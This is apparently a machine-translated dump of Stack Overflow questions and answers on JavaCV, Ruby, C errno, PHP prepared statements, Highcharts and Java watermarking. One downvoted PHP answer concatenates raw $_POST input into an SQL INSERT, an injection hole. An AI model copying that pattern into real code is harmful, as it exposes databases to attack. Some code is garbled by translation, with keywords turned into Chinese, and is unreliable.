    P2.y = 0;
else if(P2.y > srcArg->height - 1)
    P2.y = srcArg->height - 1;

// we use the integral image to compute fast features
value = (float) (
        ((int*)(srcArg->imageData + srcArg->widthStep*P2.y))[P2.x] +
        ((int*)(srcArg->imageData + srcArg->widthStep*P1.y))[P1.x] -
        ((int*)(srcArg->imageData + srcArg->widthStep*P2.y))[P1.x] -
        ((int*)(srcArg->imageData + srcArg->widthStep*P1.y))[P2.x] 
);

value = (value - centerVal)/  (( (P2.x - P1.x) * (P2.y - P1.y))-1)  ;

return value; 
```

}

我的翻译：

```
 private float getMean(IplImage srcArg, CvPoint PixArg, int neighbourhood, int centerVal)
        {
         CvPoint P1, P2;
         float value;
         P1.put( PixArg.x() - neighbourhood + 1, PixArg.y() - neighbourhood + 1);
         P2.put( PixArg.x() + neighbourhood + 1, PixArg.y() + neighbourhood + 1);

         if(P1.x() < 0)
             P1.position(0).put(0);
         else if(P1.x() > srcArg.width()- 1)
             P1.position(0).put(srcArg.width()- 1);
         if(P2.x() < 0)
             P2.position(0).put(0);
         else if(P2.x() > srcArg.width()- 1)
             P2.position(0).put(srcArg.width()- 1);
         if(P1.y() < 0)
             P1.position(1).put(0);
         else if(P1.y() > srcArg.height()- 1)
             P1.position(1).put(srcArg.height()- 1);
         if(P2.y() < 0)
             P2.position(1).put(0);
         else if(P2.y() > srcArg.height()- 1)
             P2.position(1).put(srcArg.height()- 1);

         // we use the integral image to compute fast features
         value = (float) (
                 ((int)(srcArg.imageData().get() + srcArg.widthStep()*P2.y()))[P2.x()] +
                 ((int)(srcArg.imageData().get()  + srcArg.widthStep()*P1.y()))[P1.x()] -
                 ((int)(srcArg.imageData().get()  + srcArg.widthStep()*P2.y()))[P1.x()] -
                 ((int)(srcArg.imageData().get()  + srcArg.widthStep()*P1.y()))[P2.x()] );
            );
         float[] bla= (srcArg.imageData().get()+srcArg.widthStep())[P2.x()];
         value = (value - centerVal)/  (( (P2.x - P1.x) * (P2.y - P1.y))-1)  ;

         return value;
        } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-09T16:31:57.317

好吧，我认为平等的翻译是这样的：更新：

private float getMean(IplImage srcArg, CvPoint PixArg, int neighbourhood, int centerVal) { CvPoint P1 = new CvPoint(), P2 = new CvPoint(); 浮点值；P1.put(PixArg.x() - 邻域 + 1, PixArg.y() - 邻域 + 1); P2.put(PixArg.x() + 邻域 + 1, PixArg.y() + 邻域 + 1);

```
 if (P1.x() < 0)
        P1.x(0);
    else if (P1.x() > srcArg.width() - 1)
        P1.x(srcArg.width() - 1);
    if (P2.x() < 0)
        P2.x(0);
    else if (P2.x() > srcArg.width() - 1)
        P2.x(srcArg.width() - 1);
    if (P1.y() < 0)
        P1.y(0);
    else if (P1.y() > srcArg.height() - 1)
        P1.y(srcArg.height() - 1);
    if (P2.y() < 0)
        P2.y(0);
    else if (P2.y() > srcArg.height() - 1)
        P2.y(srcArg.height() - 1);
    BytePointer src = new BytePointer(srcArg.getByteBuffer());

    int pos1 = (int) srcArg.widthStep() * P2.y();
    int pos2 = (int) (srcArg.widthStep() * P1.y());
    int pos3 = (int) (srcArg.widthStep() * P2.y());
    int pos4 = (int) (srcArg.widthStep() * P1.y());
    value = (float) (src.position(pos1).get(P2.x())
            + src.position(pos2).get(P1.x())
            - src.position(pos3).get(P1.x())
            - src.position(pos4).get(P2.x()));

    value = (value - centerVal)
            / (((P2.x() - P1.x()) * (P2.y() - P1.y())) - 1);
    // System.out.println(value);
    return value;
} 
```

# hudson-plugins - Hudson 构建超时插件

> ID：11396573
> 
> 赞同：2
> 
> 时间：2012-07-09T14:00:52.543
> 
> 标签：hudson-plugins

你们知道如何查看 hudson build timeout 插件的源代码吗？我只能找到詹金斯构建超时插件的源代码。

[https://github.com/hudson-plugins](https://github.com/hudson-plugins)不包含构建超时插件

# ruby-on-rails - Ruby 控制台 - 无法使用变量初始化类

> ID：11396581
> 
> 赞同：1
> 
> 时间：2012-07-09T14:01:15.293
> 
> 标签：ruby-on-rails, ruby

我正在使用 Ruby 控制台。我通过使用开始它`Rails console`，然后确实需要'我的文件的路径'，它工作正常。

该文件如下所示：

```
module App
  module Tools
    module Pollers
      class Kpi
        attr_reader :start_time,:stop_time

        def initialize(start_time,stop_time)
          @start_time = start_time
          @stop_time = stop_time
        end

        def create_social_audiences
        .... 
```

所以我要做的是在控制台中像这样声明停止和开始时间

```
var end_date = new Date(2012, 7, 1);
var start  = new Date(2012, 5, 1); 
```

然后我尝试在这个文件上调用 .new 并得到这个错误

```
>> kpi = App::Tools::Pollers::Kpi.new
ArgumentError: wrong number of arguments (0 for 2)
    from (irb):7:in `initialize'
    from (irb):7:in `new'
    from (irb):7
>> 
```

但奇怪的是，如果我执行这个尝试传递变量的命令，它会起作用：

```
>> kpi = App::Tools::Pollers::Kpi.new(start , end_date)
=> #<App::Tools::Pollers::Kpi:0x11489e198 @start_time=nil, @stop_time=nil> 
```

但是当我尝试将 varialbes 设置为 nil 以外的任何值时，我得到的错误是 initialize 是一个私有方法：

```
?> kpi.initialize(start, end_date)
NoMethodError: private method `initialize' called for #<App::Tools::Pollers::Kpi:0x11489e198>
    from (irb):15 
```

关于这里可能发生的错误有什么想法吗？

谢谢！！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-09T14:09:59.640

在类被实例化后，您不应该调用类初始化程序（并且您不能从类本身的外部调用，因为它具有私有可见性）。

以下内容不起作用，因为您有一个带有两个参数的初始化程序，因此您还必须传递这些参数：

```
kpi = App::Tools::Pollers::Kpi.new 
```

* * *

这是有效的，因为在构造类时调用了初始化程序（`initialize`当您使用创建新实例时始终调用该方法`new`）：

```
kpi = App::Tools::Pollers::Kpi.new(start , end_date) 
```

* * *

最后，以下内容不起作用（无论 start/end_date 持有什么值），因为正如我之前解释的那样，类的初始化程序在 ruby​​ 中是私有的：

```
 kpi.initialize(start, end_date) # Breaks! 
```

如果要在构建类后修改这些变量，请为此创建一个方法：

```
def initialize(start, end)
    set_time(start_end)
end

def set_time(start, end)
    @start_time = start
    @end_time = end
end 
```

# jquery - 元素 0 在 MVC 中的表单发布上未定义

> ID：11396584
> 
> 赞同：0
> 
> 时间：2012-07-09T14:01:25.977
> 
> 标签：jquery, asp.net-mvc, jquery-validate

我正在打开一个查询对话框，它在 MVC 应用程序中有两个查询选项卡。两个标签加载不同的部分页面。我已经在其中一个选项卡中形成。表单验证工作正常。**当表单中没有验证错误时，**我收到错误 $element[0] is undefined in jquery.validate.js @ line 806 。我无法理解什么问题。下面是代码：

```
 Include references in _Layout.cshtml:
        <script src="@Url.Content("~/Scripts/jquery-1.7.2.min.js")" type="text/javascript"></script>
        <script src="@Url.Content("~/Scripts/jquery-ui-1.8.20.min.js")" type="text/javascript"></script>
        <script src="@Url.Content("~/Scripts/jquery.unobtrusive-ajax.min.js")" type="text/javascript"></script>
        <script src="@Url.Content("~/Scripts/jquery.validate.js")" type="text/javascript"></script>

Partial view which open in one of tab:
    <script src="@Url.Content("~/Scripts/jquery.validate.unobtrusive.js")" type="text/javascript"></script>

@using (Ajax.BeginForm("UpdateMediaCode", "MediaCode", null,
        new AjaxOptions
        {
            UpdateTargetId = "myMsg",
            InsertionMode = InsertionMode.Replace,
            HttpMethod = "POST",
            OnSuccess = "mySuccess"
        }, new { @id = "myFormId" }
        ))
{
    @Html.ValidationSummary(true) 
 }
<script type="text/javascript">
    $(document).ready(function () {
        $.validator.unobtrusive.parse($('#myFormId));
    }
</script> 
```

任何帮助，将不胜感激。这里发生了什么事？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-07-09T14:06:08.113

您应该在`mySuccess`回调中用作`OnSuccess`处理程序，而不是在. 您不应该在部分中有 document.ready 处理程序。顺便说一句，您不应该在部分内容中有任何 javascript。JavaScript 应该写在单独的文件中。部分视图应该只包含标记。`AjaxForm``$.validator.unobtrusive.parse``document.ready`

# makefile - ELF 符号表中缺少源文件 - 如何包含它们？

> ID：11396585
> 
> 赞同：3
> 
> 时间：2012-07-09T14:01:27.817
> 
> 标签：makefile, arm, elf, rvds

我正在处理一个交给我的项目，其中一些构建和链接概念对我来说是新的。我有一个 makefile、几个程序集和 C 源文件、一个 ELF 文件和二进制文件。当我将 ELF 文件加载到我的目标上时，我只能单步执行 C 文件，而不是汇编文件。

当我对 ELF 文件执行 readelf 时，我看到符号表中缺少程序集 (.S) 文件。同样，我的调试器（RealView Debugger 4.1）没有在“图像源”树中列出那些 .S 文件。我可以看到这些文件中的一些符号（即标签名称）包含在我的 readelf 输出中，但不是文件类型符号本身。我一直在检查 makefile 以尝试找出可能无法包含它们的内容，但我不确定我在寻找什么。谁能指出我正确的方向？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-03T00:45:25.553

您提到使用 RealView 调试器，所以我有根据地猜测您有 RVDS。如果是这样，您是否尝试过使用 RVDS 随附的 readelf 等效项 fromelf。我现在无法确认这一点，但我记得 ARM 编译器和 gcc 生成的汇编代码之间存在细微差别。

# c - 为什么 open() 失败并且没有设置 errno？

> ID：11396589
> 
> 赞同：2
> 
> 时间：2012-07-09T14:01:46.693
> 
> 标签：c, linux, file-io, linux-kernel, errno

在我的代码`open()`中失败，返回码为 -1，但不知何故`errno`没有设置。

```
int fd;
int errno=0;
fd = open("/dev/tty0", O_RDWR | O_SYNC);
printf("errno is %d and fd is %d",errno,fd); 
```

输出是

```
errno is 0 and fd is -1 
```

为什么没有设置errno？我如何确定`open()`失败的原因？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-07-09T14:05:44.730

> ```
> int errno=0; 
> ```

问题是你 redeclared `errno`，从而隐藏了全局符号（它甚至不需要是一个普通的变量）。效果是设置和打印的**内容`open`是不同的**。相反，您应该包括标准`errno.h`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-09T14:05:42.120

您不应该自己定义 errno 变量。errno 它是 errno.h 中定义的全局变量（它比变量更复杂）所以删除你`int errno = 0;`并再次运行。不要忘记包含 errno.h

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-09T14:07:28.903

您正在声明一个局部`errno`变量，有效地掩盖了全局`errno`. 您需要包含`errno.h`并声明 extern errno，例如：

```
#include <errno.h>
...

extern int    errno;

...
fd = open( "/dev/tty0", O_RDWR | O_SYNC );
if ( fd < 0 ) {
    fprintf( stderr, "errno is %d\n", errno );
    ... error handling goes here ...
} 
```

您还可以使用`strerror()`将 errno 整数转换为人类可读的错误消息。您需要为此包括`string.h`：

```
#include <errno.h>
#include <string.h>

fprintf( stderr, "Error is %s (errno=%d)\n", strerror( errno ), errno ); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-09T14:06:51.383

请将此添加到您的模块中：`#include <errno.h>` 而不是`int errno;`

# ruby-on-rails - 在 Rails 中对子控制器执行操作后，如何控制访问者被重定向到的位置？

> ID：11396592
> 
> 赞同：0
> 
> 时间：2012-07-09T14:01:55.410
> 
> 标签：ruby-on-rails, controller

我正在为我的 Rails 项目中的一些对话建模：我将主题作为父模型，将评论作为该模型的子模型。

当用户访问该`http://www.example.com/topics/show/2`页面时，我的项目会向他们显示与给定主题相关的许多评论。在该页面上，如果用户单击评论记录上的删除按钮，则会向该页面发送请求`comments_controller`并执行该`destroy`操作。然后该请求将用户重定向到根页面。

而不是这种行为，我希望他们被重定向回带有评论的主题页面。我怎样才能得到这种行为？我对此感到困惑，因为只有被删除评论的 ID 是`comments_controller`从主题视图页面传递给的。它不会传递评论附加到的主题的 ID，因此我不能使用它来将用户引导回`/topics/show/2`页面。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T14:04:51.707

在您的操作结束时：

```
redirect_to :back 
```

# php - 插入带有准备好的语句的日期时间

> ID：11396604
> 
> 赞同：5
> 
> 时间：2012-07-09T14:02:35.240
> 
> 标签：php, datetime, pdo, mysqli, prepared-statement

我正在尝试使用准备好的语句为库应用程序插入日期时间。这是到目前为止的代码：

```
 global $dbh;
    $query = "INSERT INTO `loan` SET
             `title` = (?), //example value - Lord of the Rings
             `description` = (?), //example value - Trilogy
             `start_date` = (?), //example value 20120701 in String datatype
             `end_date` = (?)";  //example value 20120702 in String datatype

    $statement = $dbh->prepare($query);
    $statement->bind_param("ssss", $title,$description,$startDate,$endDate);

    $statement->execute();
    print $statement->error; //to check errors
    $statement->close(); 
```

但是，我似乎无法将此值插入行中。同时，不知何故

```
 print $statement->error 
```

似乎没有显示任何错误。

任何帮助都可以。

更新：

它确实有效。我只是引用了错误的数据库。但我想为偶然发现这一点的新人添加一点结尾。

1.  删除评论/答案中提到的所有评论，因为它们会弄乱您的字符串。

2.  对于 DATETIME，请记住将数据类型指定为 String，因为 MySQL 仅识别 String 数据类型。如果您没有使用准备好的查询，这意味着您必须为值添加 '' 引号。

3.  由于未指定时间，插入将导致日期 (2012-07-01 00:00:00) 格式。

4.  两个 SQL 查询都有效。INSERT INTO tbl_name SET col_name = value 或 INSERT INTO tbl_name(col_name) VALUES (value) 工作。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-09T14:22:48.933

尝试这样的事情：

```
global $dbh;
$query = "INSERT INTO loan (title, description, start_date, end_date) VALUES (?,?,?,?)"

$statement = $dbh->prepare($query);
$statement->bind_param("ssss", $title,$description,$startDate,$endDate);

$statement->execute();
print $statement->error; //to check errors
$statement->close(); 
```

* * *

## 回答 #2

> 赞同：-5
> 
> 时间：2012-07-09T14:24:27.907

假设您的日期表单输入是一个名为“日期”的类型输入，这就是您要做的。在 php 类型中

```
$date = $_POST['date']

$query = "INSERT INTO `loan` SET
             `title` = (?), 
             `description` = (?), 
             `start_date` = ".$date. //Insert variable here
             "`end_date` = (?)"; 
```

我知道在一个单一类型的输入中插入日期不是一个好习惯，但我只是为了简单起见才使用这个例子。你可以找出自己的正确方法。

# .net - 如何检索与 machine.config 合并的 .NET 可执行 app.config

> ID：11396606
> 
> 赞同：3
> 
> 时间：2012-07-09T14:02:38.143
> 
> 标签：.net, configuration

在我当前的项目中，我们有一个带有一些配置（app.config、自定义 ConfigurationSection 等）的 .NET 控制台应用程序。在配置中，指定了本地文件系统上文件的多个路径。由于各个开发人员机器上的路径可能不同，我希望在 machine.config 中而不是在 app.config 中指定它们，因此每个开发人员都可以用自己的路径“覆盖”它们。

所以在 app.config 我注册了 configSection（元素'configSections'），但在配置部分我没有定义路径。在 machine.config 中，我注册了 configSection 并将 configSection 添加到我的路径中。

它看起来像这样：

应用程序配置：

```
<configSections>
  <section name="importingExec" 
           type="ImportingExecutableConfigSection, Executable" />
</configSections>

<importingExec>
  <!-- xmlSchema xmlSchemaPath="D:\foo.xsd"/ -->
</importingExec> 
```

机器配置：

```
<configSections>
  <section name="importingExec" 
           type="ImportingExecutableConfigSection, Executable" />
</configSections>

<importingExec>
  <xmlSchema xmlSchemaPath="D:\foo.xsd"/>
</importingExec> 
```

我有以下问题：当我检索配置时，由于缺少配置部分（必需！）而引发异常。我预计 machine.config 中的值将被返回！

PS：我通过调用检索配置部分

```
ConfigurationManager
    .OpenExeConfiguration(ConfigurationUserLevel.None)
    .GetSection("importingExec"); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:55:30.343

You are explicitly requesting the exe's config file by using that code.

You should use

```
ConfigurationManager.GetSection("importingExec") 
```

in order to get the merged files.

Cheers Chris

# iphone - 如何使用 NSDateFormatter 将 NSString 转换为 NSDate？

> ID：11396609
> 
> 赞同：1
> 
> 时间：2012-07-09T14:02:38.733
> 
> 标签：iphone, ios, nsstring, nsdate, nsdateformatter

我从网络服务中获取日期，例如“2012-07-03 07:26:48”。从 web 服务解析后，我已经保存在 NSString 中。在将 NSString 转换为下面代码中使用的 NSDate 时，

```
 NSDateFormatter *dateFormatter1 = [[NSDateFormatter alloc] init];
    [dateFormatter1 setDateFormat:@"yyyy-MM-dd hh:mm:ss"];

    NSString *dateStr = @"2012-07-03 07:26:48";
    NSDate *date = [dateFormatter1 dateFromString:dateStr];
    NSLog(@"Date : %@", date);
   The NSLog value is "2012-07-03 01:56:48 +0000"; 
```

NSLog 值为“2012-07-03 01:56:48 +0000”；我不知道为什么时间变了。谁能帮我做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T14:11:39.350

您需要将时区设置为：

```
theDateFormatter.timeZone = [NSTimeZone timeZoneForSecondsFromGMT:0]; 
```

因为它正在考虑 GMT 时间格式。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T14:11:32.033

您必须设置`NSDateFormatter`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-09-12T07:07:35.243

默认情况下，在将字符串转换为 nsdate 时，日期以 utc 格式保存...您可以从日期获取原始时间作为字符串..如果您想更改时区，请使用 dateformatter 进行更改..否则不要更改

# java - 散点图不会改变颜色

> ID：11396616
> 
> 赞同：1
> 
> 时间：2012-07-09T14:03:10.223
> 
> 标签：java, eclipse, gnuplot, javaplot

我正在尝试更改 3D 散点图上点的颜色。点变为黑色，而不是我想要的颜色，键上的点变为正确的颜色。有谁知道为什么会这样？

```
import com.panayotis.gnuplot.JavaPlot;
import com.panayotis.gnuplot.plot.*;
import com.panayotis.gnuplot.style.NamedPlotColor;
import com.panayotis.gnuplot.style.PlotStyle;
import com.panayotis.gnuplot.style.Style;

public class ScatterPlot4D {

public static void main(String[] args) {

    int rows = 100;
    int D = 4;

    double [][] dataSet = new double [rows][D];
    for(int x = 0;x < rows; x++){
        for(int y = 0;y < D; y++){
            dataSet[x][y]=Math.random();
        }
    }

    JavaPlot p = new JavaPlot("C:\\Program Files\\gnuplot\\bin\\pgnuplot.exe");       
    p.newGraph3D();

    PlotStyle myStyle = new PlotStyle();
    myStyle.setStyle(Style.POINTS);
    myStyle.setLineType(NamedPlotColor.BLUE); 

    DataSetPlot myPlot = new DataSetPlot(dataSet);  
    myPlot.setPlotStyle(myStyle);

    p.addPlot(myPlot);

    p.splot();

}
} 
```

奇怪的是这在绘制函数时有效。

```
import com.panayotis.gnuplot.GNUPlot;
import com.panayotis.gnuplot.plot.*;
import com.panayotis.gnuplot.style.NamedPlotColor;
import com.panayotis.gnuplot.style.PlotStyle;
import com.panayotis.gnuplot.style.Style;

public class test3D {

public static void main(String[] args) {

    GNUPlot p = new GNUPlot("C:\\Program Files\\gnuplot\\bin\\pgnuplot.exe");

    p.newGraph3D();

    PlotStyle myStyle = new PlotStyle();
    myStyle.setStyle(Style.IMPULSES);
    myStyle.setLineType(NamedPlotColor.BLUE); 

    FunctionPlot myPlot = new FunctionPlot("tan(x)");
    myPlot.setTitle("3D Plot");
    myPlot.setPlotStyle(myStyle);

    p.addPlot(myPlot);

    p.splot();

}

} 
```

正在向 gnuplot 发送命令：

```
gnuplot> set multiplot layout 1,2 rowsfirst downwards
multiplot> _gnuplot_error = 1
multiplot> splot '-' title 'Datafile 1' with points linetype rgb 'blue' ;_gnuplot_error = 0X
input data ('e' ends) > random data is here, not included for brevity
multiplot> if (_gnuplot_error == 1) print '_ERROR_'
 multiplot> unset multiplot 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-10T01:38:57.593

好吧，我认为您需要的是在散点图中使用 setPointType 而不是 setLineType，因为它没有线条。它只有积分。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-24T18:35:52.037

正如 mgilson 在评论中所说：

```
 use myStyle.setLineType(3); 
```

（@mgilson，如果您想获得答案，请自己写，给我发消息，我会接受它_

# shell - 在 OS X Lion 中将目录添加到系统路径

> ID：11396626
> 
> 赞同：0
> 
> 时间：2012-07-09T14:03:35.193
> 
> 标签：shell, path, playframework, osx-lion, playframework-2.0

我不知道如何将目录添加到系统路径。我发现命令是这样的：

```
export PATH=$PATH:/my_path/to/my_dir 
```

## 例子

我在我的安装目录所在的路径中运行终端。在这种情况下，我说的是 Play Framework。我输入：

```
export PATH=$PATH:/to/play20 
```

看起来什么都没有发生。事实上，当我输入命令“play”（执行框架）时，我得到：

```
-bash: play: command not found 
```

有人可以给我一个体面的分步指南吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T15:01:47.597

执行命令“/to/play20/play help”。如果这给出了预期的输出（播放命令的帮助），那么可执行文件是可用的，并且问题出在 shell 路径中。如果它没有给出预期的输出，那么可执行文件不工作。

在前一种情况下，请确保您正在运行 bash shell。（这是 Mac OS X 最新版本的默认设置，但可能会针对特定帐户进行更改。）要临时执行此操作，请执行命令“bash”。（当你想退出临时shell时，执行命令“exit”。）然后再次执行export命令。（当导出命令起作用时，它改变了变量而不显示任何输出，所以这是正常的。）仔细检查导出命令中的拼写。

在后一种情况下，执行“ls -ld /to/play20/play”。如果您收到文件不存在的消息，则可执行文件未正确安装，我无法进一步帮助您。如果该文件存在，那么由于某种原因它是不可执行的。这可能是因为您没有访问它的权限（尤其是执行它的权限，在 ls 输出的初始字段的某些位置用“x”标记，可能包含连字符、“r”、“w”和其他几个字母）或它是一个不存在的文件的符号链接（由文件的 ls 输出的第一个字符中的“l”表示）。假设您具有更改系统权限的适当权限，则可以通过 chmod 命令修复缺少权限。如果该文件是指向另一个文件的符号链接，则可能是安装错误，

# iphone - 发送动态数据

> ID：11396627
> 
> 赞同：0
> 
> 时间：2012-07-09T14:03:36.740
> 
> 标签：iphone, ios, cocos2d-iphone, game-center, gamekit

我为移动定义了一个结构

```
typedef struct {
    MsgType msgType;
    int newFallenStonesSize;
    char *newFallenStones;
} MsgMove; 
```

并像这样发送数据：

```
MsgMove message;
message.msgType = MsgTypeMove;     
message.newFallenStones = (char *)malloc(nrNewFallenStones*sizeof(char));
for (int i=0; i<nrNewFallenStones; i++) {
    message.newFallenStones[i]=newFallenStones[i];
}
message.newFallenStonesSize = nrNewFallenStones;

NSData *data = [NSData dataWithBytes:&message length:(2*sizeof(int)+message.newFallenStonesSize*sizeof(char))];          

[[KKGameKitHelper sharedGameKitHelper] sendDataToAllPlayers:data reliable:YES]; 
```

发送时数据是正确的，但是当我像这样收到它时：

```
else if (msg->msgType == MsgTypeMove)
{
    MsgMove *msgMove = (MsgMove *) [data bytes]; 
    for (int i=0; i<msgMove->newFallenStonesSize; i++) {
        NSLog(@"New Stone received:%i",msgMove->newFallenStones[i]);
    }
} 
```

价值观发生了变化。例如 1、6、3，我收到 76、105 98。

任何人都知道为什么会这样？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T15:30:08.323

主要问题是您通过网络发送指向数据的指针，而不是实际数据。当您对其进行 malloc 空间时，`message.newFallenStones`它将被设置为内存中与您的`MsgMove`结构不相邻的某个明显随机的位置。然后，您将数据写入此其他内存位置。您打包传输的是 MsgMove 结构（带有指向内存中其他位置的指针）加上内存中紧随其后的任何随机字节。

处理这种情况的典型方法是让您的整个消息被 malloc'ed 在一起并将数据写入它的末尾。更像：

```
typedef struct {
    MsgType msgType;
    int newFallenStonesSize;
    char newFallenStones;        // The first newFallenStones value
} MsgMove; 
```

然后发送

```
MsgMove *message;
message = (MsgMove *)malloc(sizeof(MsgMove)+nrNewFallenStones-1);
message->msgType = MsgTypeMove;     
message->newFallenStonesSize = nrNewFallenStones;
char *newStones = &MsgMove->newFallenStones;
for (int i=0; i<nrNewFallenStones; i++) {
    newStones[i]=newFallenStones[i];
}

NSData *data = [NSData dataWithBytes:message length:(sizeof(MsgMove)+nrNewFallenStones-1)];          

[[KKGameKitHelper sharedGameKitHelper] sendDataToAllPlayers:data reliable:YES]; 
```

# javascript - Highcharts 日期时间轴，如何禁用时间部分（仅显示日期）？

> ID：11396628
> 
> 赞同：12
> 
> 时间：2012-07-09T14:03:37.100
> 
> 标签：javascript, datetime, highcharts

我的图表**每天**显示数据（用户和系统发送的 SMS/通讯）。所以时间部分是不相关和不必要的。这是一个示例： http: [//jsfiddle.net/uaxZP/1/](http://jsfiddle.net/uaxZP/1/)显示时间“12:00”。

如何强制 Highcharts**永远不要在“日期时间”轴中显示时间部分**？

**编辑**：Highcharts 将根据图表或屏幕尺寸显示日期w/wo时间。我已经更新了 jsfiddle 删除了一些数据，现在它也显示了时间部分。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-07-09T14:40:35.693

您可以截取 x 轴标签函数并更改其输出。在我的示例中，我已将其更改为呈现短日期：

[http://jsfiddle.net/uaxZP/3/](http://jsfiddle.net/uaxZP/3/)

```
{ xAxis: 
    labels: {
        formatter: function() {
             return Highcharts.dateFormat("%b %e", this.value);
        }
    }
} 
```

xAxis.labels.formatter 属性允许对此进行控制。您还可能注意到我正在使用 Highcharts.dateFormat，它是一个用于呈现日期的实用函数。这不是强制性的，但它是一个很好的内置功能。xAxis 格式化程序的文档在这里：

[http://www.highcharts.com/ref/#xAxis-labels--formatter](http://www.highcharts.com/ref/#xAxis-labels--formatter)

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-10-10T19:31:27.667

最简单的方法是使用“minTickInterval”

```
xAxis: {
       minTickInterval: 24 * 3600 * 1000
} 
```

[http://api.highcharts.com/highcharts#xAxis.minTickInterval](http://api.highcharts.com/highcharts#xAxis.minTickInterval)

# javascript - 用户下载后立即打开文件

> ID：11396629
> 
> 赞同：-1
> 
> 时间：2012-07-09T14:03:37.953
> 
> 标签：javascript, html, scripting, onclick, download

目前，我有一个链接可以下载 HTML 页面上的文件。如果点击，它会询问用户是否确定他们想要下载该文件，并且在用户点击“是”后它会下载该文件。有没有办法让它在用户说“是”后立即​​打开文件？

由于事情是用户必须进入他们的下载文件夹并单击下载的文件。然后计算机询问用户是否确定他们想要打开文件。我只是想消除最后两次点击，以使用户更方便。

一旦用户决定要下载文件，也许我可以运行某种脚本？我对你们可能采用的任何方法持开放态度。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-09T14:05:27.063

这是您无法绕过的安全措施，是为了客户自身的安全。您无法实现这一点（好吧，也许在带有 ActiveX 控件的 IE 上，但这不会涵盖 100% 的情况）。

# android - 第三方支付集成

> ID：11396630
> 
> 赞同：1
> 
> 时间：2012-07-09T14:03:40.113
> 
> 标签：android, payment

我想在我的应用程序中集成第三方支付服务。Android 会阻止我这样做吗？我需要给谷歌多少钱才能使用它吗？或者还有其他条款吗？？

请帮忙。谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-09T14:18:38.027

您无需向 Google 支付任何金额。您可以 100% 自由地在您的应用中添加第三方支付服务。

可是等等！你可以这样做，前提是你不向你的应用出售额外的功能，我的意思是，你可以添加一项捐赠服务，但如果你的应用用于下载壁纸（例如），你不能选择购买额外的壁纸或添加额外的壁纸应用程序的功能...

希望我对你有所帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T14:10:50.717

不，我不认为谷歌会阻止你。而且我也不认为你需要给谷歌任何东西。例如检查来自 PayPal 的 android 库。我已经在应用程序中实现了它，并且从来没有遇到任何问题。

（但我没有阅读任何有关此的条款或条件！！！）

**编辑：** 同意 KrLx_roller

有关铁道部的信息，您可以查看：

[http://www.android.com/us/developer-distribution-agreement.html](http://www.android.com/us/developer-distribution-agreement.html)

# java - Java Graphics2D - 带有随机定位标签云的图像水印

> ID：11396631
> 
> 赞同：1
> 
> 时间：2012-07-09T14:03:40.357
> 
> 标签：java, random, graphics2d, watermark

我正在尝试获取输入图像并使用 Java 中的文本字符串对其进行水印。我有这个程序的 2 个版本。

第一个版本使用字体大小作为相等的间距水平和垂直地遍历图像。

第二个版本创建一个 Rectangle 对象列表，并检查添加到列表中的每个矩形是否与现有矩形相交。如果它确实相交，那么它会随机移动 Rectangle 直到它适合。

我的问题是 - 即使我正在检查现有矩形列表，第二个版本也不能防止重叠文本： if(rectList.get(j).intersects(rect))

任何人都可以帮忙吗？

**版本 1**

```
/*
* Author: Hugh Pearse
* Purpose: watermark image
*/
import java.awt.AlphaComposite;
import java.awt.Color;
import java.awt.Graphics2D;
import java.awt.image.BufferedImage;
import java.io.File;
import javax.imageio.ImageIO;
import java.awt.Font;

public class Prog5 {

    public static void main(String[] args) {

        try {
            int fontSize = 12;
            BufferedImage image = ImageIO.read(new File(args[0]));
            Graphics2D g = (Graphics2D) image.getGraphics();

            AlphaComposite ac = AlphaComposite.getInstance(AlphaComposite.SRC_OVER, .3f);
            g.setComposite(ac);
            g.setFont(new Font( "SansSerif", Font.BOLD, fontSize ));
            g.setColor(Color.blue);

            String msg = "©Hugh Pearse";
            for(int i=1; i<=image.getHeight(); i=i+fontSize)
            for(int j=1; j<=image.getWidth(); j=j+(fontSize*msg.length()))
            g.drawString(msg, j, i);

            ImageIO.write(image, "jpg", new File(args[0].toString().replace(".", "_watermarked.")));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
} 
```

**版本 2**

```
/*
 * Author: Hugh Pearse
 * Purpose: Randomly located watermark v3
 */
import java.awt.AlphaComposite;
import java.awt.Color;
import java.awt.FontMetrics;
import java.awt.Graphics2D;
import java.awt.Rectangle;
import java.awt.image.BufferedImage;
import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import javax.imageio.ImageIO;
import java.awt.Font;

public class Image1 {
    public static void main(String[] args) {
        try {
            Random rand = new Random();

            //variables for controlling visual effect
            int fontSize = 40;
            String msg = "©Hugh Pearse";
            float msgOpacity = .1f;
            String typeface = "SansSerif";
            int style = Font.BOLD;
            Color msgColour = Color.blue;
            int numberOfWatermarks = 16;

            //image objects
            BufferedImage image = ImageIO.read(new File(args[0]));
            Graphics2D g = (Graphics2D) image.getGraphics();

            //apply settings for overlay
            AlphaComposite ac = AlphaComposite.getInstance(AlphaComposite.SRC_OVER, msgOpacity);
            g.setComposite(ac);
            g.setColor(msgColour);

            List<Rectangle> rectList = new ArrayList<Rectangle>();

            for(int i=0; i<=numberOfWatermarks; i++){
